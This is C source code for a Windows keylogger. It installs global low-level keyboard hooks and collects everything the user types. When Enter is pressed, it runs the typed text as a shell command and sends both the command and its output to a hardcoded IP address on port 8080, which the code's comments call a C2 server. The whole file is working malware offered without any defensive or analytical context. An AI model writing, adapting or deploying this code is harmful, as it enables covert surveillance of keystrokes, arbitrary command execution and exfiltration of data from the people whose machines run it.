#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <stdlib.h>

// Global variables
HHOOK g_hHook_Char = NULL;
HHOOK g_hHook_ON_ENTER = NULL;
char g_concatenatedCommand[1024] = { 0 };

// Hook procedure for capturing characters
LRESULT CALLBACK Hook_Char(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;

        // Check if the character is not an ENTER key
        if (pKeyStruct->vkCode != VK_RETURN) {
            char c = MapVirtualKeyA(pKeyStruct->vkCode, MAPVK_VK_TO_CHAR);
            strncat(g_concatenatedCommand, &c, 1);
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Hook procedure for capturing the concatenated command on ENTER
LRESULT CALLBACK Hook_ON_ENTER(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;

        // Check if the character is the ENTER key
        if (pKeyStruct->vkCode == VK_RETURN) {
            // Get the command
            char command[1024];
            strcpy(command, g_concatenatedCommand);

            // Clear the concatenated command buffer
            memset(g_concatenatedCommand, 0, sizeof(g_concatenatedCommand));

            // Get the command output
            FILE* cmdOutput = _popen(command, "r");
            if (cmdOutput == NULL) {
                return CallNextHookEx(NULL, nCode, wParam, lParam);
            }

            char output[4096];
            size_t bytesRead = fread(output, 1, sizeof(output) - 1, cmdOutput);
            output[bytesRead] = '\0';

            // Establish socket connection
            WSADATA wsaData;
            if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
                _pclose(cmdOutput);
                return CallNextHookEx(NULL, nCode, wParam, lParam);
            }

            SOCKET g_socket = socket(AF_INET, SOCK_STREAM, 0);
            if (g_socket == INVALID_SOCKET) {
                _pclose(cmdOutput);
                WSACleanup();
                return CallNextHookEx(NULL, nCode, wParam, lParam);
            }

            SOCKADDR_IN serverAddr;
            serverAddr.sin_family = AF_INET;
            serverAddr.sin_addr.s_addr = inet_addr("172.20.237.122");
            serverAddr.sin_port = htons(8080);

            // Connect to the C2 server
            if (connect(g_socket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
                _pclose(cmdOutput);
                closesocket(g_socket);
                WSACleanup();
                return CallNextHookEx(NULL, nCode, wParam, lParam);
            }

            // Send the command and output to the C2 server
            send(g_socket, command, strlen(command), 0);
            send(g_socket, output, strlen(output), 0);

            // Close the socket and clean up
            closesocket(g_socket);
            WSACleanup();

            // Close the command output file
            _pclose(cmdOutput);
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Function to attach hooks to the specified process ID
BOOL AttachHooksToProcess(DWORD dwProcessId) {
    HMODULE hModule = GetModuleHandle(NULL);

    // Set the hook for capturing characters
    g_hHook_Char = SetWindowsHookEx(WH_KEYBOARD_LL, Hook_Char, hModule, 0);
    if (g_hHook_Char == NULL) {
        printf("Failed to set the character hook. Error code: %lu\n", GetLastError());
        return FALSE;
    }

    // Set the hook for capturing the concatenated command on ENTER
    g_hHook_ON_ENTER = SetWindowsHookEx(WH_KEYBOARD_LL, Hook_ON_ENTER, hModule, 0);
    if (g_hHook_ON_ENTER == NULL) {
        printf("Failed to set the ON_ENTER hook. Error code: %lu\n", GetLastError());
        UnhookWindowsHookEx(g_hHook_Char);
        return FALSE;
    }

    return TRUE;
}

// Function to find the process ID of the running cmd instance
DWORD FindcmdProcessId() {
    DWORD dwProcessId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 processEntry;
        processEntry.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &processEntry)) {
            do {
                if (lstrcmpi(processEntry.szExeFile, "cmd.exe") == 0) {
                    dwProcessId = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &processEntry));
        }

        CloseHandle(hSnapshot);
    }

    return dwProcessId;
}

// Entry point
int main() {
    DWORD dwcmdPid = FindcmdProcessId();
    if (dwcmdPid == 0) {
        printf("cmd process not found.\n");
        return 0;
    }

    if (!AttachHooksToProcess(dwcmdPid)) {
        printf("Failed to attach hooks to cmd process.\n");
        return 0;
    }

    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Clean up the hooks
    UnhookWindowsHookEx(g_hHook_Char);
    UnhookWindowsHookEx(g_hHook_ON_ENTER);

    return 0;
}